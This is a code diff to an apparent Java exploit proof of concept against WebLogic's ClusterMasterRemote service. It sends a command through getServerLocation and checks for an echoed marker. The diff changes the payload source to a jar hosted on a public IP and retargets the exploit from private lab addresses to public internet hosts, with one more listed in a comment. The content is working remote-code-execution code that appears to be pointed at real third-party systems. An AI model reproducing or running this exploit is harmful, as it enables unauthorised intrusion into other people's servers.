@@ -106,10 +106,11 @@ public class S1274489 implements VulTest {
             ClusterMasterRemote poc = (ClusterMasterRemote)context.lookup(bindName);
             this.remote = poc;
             String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
-            cmd += "@@"+currentOs;
+            cmd += "@@"+currentOs+"####"+ip+":"+port;
             String rsp = poc.getServerLocation(cmd);
             return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
         }catch (Exception e){
+            e.printStackTrace();
             return false;
         }finally {
             System.gc();
@@ -219,11 +220,16 @@ public class S1274489 implements VulTest {
 
     public static void main(String[] args) throws Exception {
         String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
-        url = "http://10.10.10.172:9999/com.bea.javascript.jar";
+//        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
+        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
         List<String> hostList = new ArrayList();
-        hostList.add("10.10.10.172:7001");
-//        hostList.add("192.168.1.9:7001");
+//        hostList.add("192.168.1.3:7001");
+//        hostList.add("192.168.1.11:7001");
 //        hostList.add("192.168.1.12:7001");
+        // 129.144.145.179:7001
+        // 35.244.31.56:7001
+        hostList.add("35.244.31.56:7001");
+        // http:///
         for (String host:hostList) {
             String ip = host.split(":")[0];
             Integer port = Integer.parseInt(host.split(":")[1]);
